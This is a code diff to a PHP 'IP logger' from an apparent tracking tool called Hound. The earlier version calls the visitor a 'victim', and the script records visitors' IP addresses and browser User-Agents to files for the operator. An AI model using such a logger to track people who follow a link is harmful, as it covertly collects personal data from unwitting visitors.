@@ -1,29 +1,31 @@
 <?php
+// Hound v1.0 — IP Logger
+// Captures IP, User-Agent with timestamp and rate limiting
 
-if (!empty($_SERVER['HTTP_CLIENT_IP']))
-    {
-      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-    }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-    {
-      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-    }
-else
-    {
-      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-    }
-$useragent = " User-Agent: ";
-$browser = $_SERVER['HTTP_USER_AGENT'];
+$ip = '';
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ip = $_SERVER['REMOTE_ADDR'];
+}
 
+$browser = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
+$timestamp = date('Y-m-d H:i:s');
 
-$file = 'ip.txt';
-$victim = "IP: ";
-$fp = fopen($file, 'a');
+// Simple rate limit — 1 log per IP per 5 seconds
+$ratefile = sys_get_temp_dir() . '/hound_rate_' . md5($ip);
+if (file_exists($ratefile) && (time() - filemtime($ratefile)) < 5) {
+    exit;
+}
+touch($ratefile);
 
-fwrite($fp, $victim);
-fwrite($fp, $ipaddress);
-fwrite($fp, $useragent);
-fwrite($fp, $browser);
+// Log to ip.txt (for terminal detection)
+$entry = "IP: {$ip}\n";
+file_put_contents('ip.txt', $entry);
 
-
-fclose($fp);
+// Log to saved.ip.txt (persistent)
+$full = "[{$timestamp}] IP: {$ip} | UA: {$browser}\n";
+file_put_contents('saved.ip.txt', $full, FILE_APPEND);
+?>
